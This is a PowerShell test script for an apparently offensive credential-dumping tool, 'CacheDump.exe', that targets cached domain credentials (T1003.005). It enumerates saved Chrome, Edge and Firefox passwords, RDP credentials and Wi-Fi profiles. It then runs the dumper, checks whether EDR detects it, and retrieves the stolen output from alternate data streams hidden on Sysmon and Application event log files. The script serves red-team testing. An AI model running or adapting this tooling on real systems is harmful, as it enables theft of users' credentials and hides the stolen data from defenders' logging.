# run_test.ps1 — Test script for Plan 5: Cached Domain Credentials
# Target: T1003.005 | Pre-condition: Administrator/SYSTEM

param(
    [switch]$SkipDetect,
    [switch]$MscacheOnly,
    [switch]$BrowserOnly
)

$ErrorActionPreference = "Continue"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ToolDir   = Split-Path -Parent $ScriptDir
$ToolPath  = Join-Path $ToolDir "CacheDump.exe"

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Cached Credential Dump Test — T1003.005" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ─── Test 1: Environment Check ───
Write-Host "[Test 1/5] Environment Check" -ForegroundColor Yellow

$os = Get-CimInstance Win32_OperatingSystem
Write-Host "  OS: $($os.Caption) (Build $($os.BuildNumber))"

# Check domain membership
$isDomainJoined = $false
try {
    $domain = Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    if ($domain -and $domain -ne "WORKGROUP") {
        Write-Host "  Domain: $domain" -ForegroundColor Green
        $isDomainJoined = $true
    } else {
        Write-Host "  [!] Not domain-joined (MSCache/Kerberos sources unavailable)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "  [i] Cannot determine domain membership" -ForegroundColor DarkGray
}

# Check privilege
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "  [!] Not Administrator — some sources will be unavailable" -ForegroundColor Yellow
} else {
    Write-Host "  Privilege: Administrator" -ForegroundColor Green
}

# List potential credential sources
Write-Host "`n  Potential sources:" -ForegroundColor DarkGray

# Browser check
$browsers = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
}
foreach ($browser in $browsers.GetEnumerator()) {
    $exists = Test-Path $browser.Value
    $status = if ($exists) { "FOUND" } else { "not found" }
    $color  = if ($exists) { "Green" } else { "DarkGray" }
    Write-Host "    $($browser.Key): $status" -ForegroundColor $color
}

# RDP check
try {
    $rdpCreds = cmdkey /list | Select-String "TERMSRV"
    if ($rdpCreds) {
        Write-Host "    RDP: $($rdpCreds.Count) saved connections" -ForegroundColor Green
    } else {
        Write-Host "    RDP: no saved connections" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "    RDP: check failed" -ForegroundColor DarkGray
}

# Wi-Fi check
try {
    $wifiOutput = netsh wlan show profiles 2>&1
    $wifiCount = ($wifiOutput | Select-String "All User Profile").Count
    if ($wifiCount -gt 0) {
        Write-Host "    Wi-Fi: $wifiCount profiles" -ForegroundColor Green
    } else {
        Write-Host "    Wi-Fi: no profiles" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "    Wi-Fi: check failed" -ForegroundColor DarkGray
}

Write-Host ""

# ─── Test 2: Build Check ───
Write-Host "[Test 2/5] Build Check" -ForegroundColor Yellow

if (-not (Test-Path $ToolPath)) {
    Write-Host "  [!] CacheDump.exe not found. Building..." -ForegroundColor Yellow
    Push-Location $ToolDir
    & cmd.exe /c "build.bat"
    Pop-Location
}

if (Test-Path $ToolPath) {
    $toolSize = (Get-Item $ToolPath).Length
    Write-Host "  Tool: $ToolPath ($([math]::Round($toolSize/1KB, 1)) KB)" -ForegroundColor Green
} else {
    Write-Host "  [ERR] Build failed — cannot run tests" -ForegroundColor Red
    exit 1
}

Write-Host ""

# ─── Test 3: EDR Check ───
if (-not $SkipDetect) {
    Write-Host "[Test 3/5] EDR Detection Check" -ForegroundColor Yellow
    & "$ScriptDir\detect_check.ps1"
    Write-Host ""
} else {
    Write-Host "[Test 3/5] EDR Detection Check — SKIPPED" -ForegroundColor Yellow
    Write-Host ""
}

# ─── Test 4: Run Cache Dump ───
Write-Host "[Test 4/5] Run Cache Dump" -ForegroundColor Yellow

$args = @()
if ($MscacheOnly) {
    $args += "--mscache-only"
    Write-Host "  Mode: MSCache v2 Only" -ForegroundColor Yellow
} elseif ($BrowserOnly) {
    $args += "--browser-only"
    Write-Host "  Mode: Browser Passwords Only" -ForegroundColor Yellow
} else {
    Write-Host "  Mode: Full Multi-Source" -ForegroundColor Yellow
}

$startTime = Get-Date
try {
    $output = & $ToolPath $args 2>&1
    $exitCode = $LASTEXITCODE
} catch {
    Write-Host "  [ERR] Tool execution failed: $_" -ForegroundColor Red
    $exitCode = -1
}
$endTime = Get-Date
$duration = ($endTime - $startTime).TotalSeconds

Write-Host "  Duration: $([math]::Round($duration, 1))s" -ForegroundColor Cyan
Write-Host "  Exit code: $exitCode"

if ($output) {
    Write-Host "`n  --- Tool Output ---" -ForegroundColor DarkGray
    $output | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
    Write-Host "  --- End Output ---`n" -ForegroundColor DarkGray
}

Write-Host ""

# ─── Test 5: Verify Output ───
Write-Host "[Test 5/5] Verify Output" -ForegroundColor Yellow

$adsTargets = @(
    "$env:SystemRoot\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
    "$env:SystemRoot\System32\winevt\Logs\Application.evtx",
    "$env:SystemRoot\System32\LogFiles\HTTPERR\httperr1.log"
)

$adsFound = $false
foreach ($target in $adsTargets) {
    $adsPath = "$target`:CacheDump"
    try {
        $adsContent = Get-Content -Path $adsPath -Raw -EA SilentlyContinue
        if ($adsContent) {
            Write-Host "  ADS Found: $adsPath ($($adsContent.Length) chars)" -ForegroundColor Green
            $adsFound = $true
            break
        }
    } catch {}
}

if (-not $adsFound) {
    Write-Host "  [!] No ADS output detected" -ForegroundColor Yellow
    Write-Host "  [i] This is normal if no credentials were found" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Test Complete" -ForegroundColor Cyan
Write-Host "  ADS output: $adsFound" -ForegroundColor $(if ($adsFound) { "Green" } else { "Yellow" })
Write-Host "============================================================" -ForegroundColor Cyan
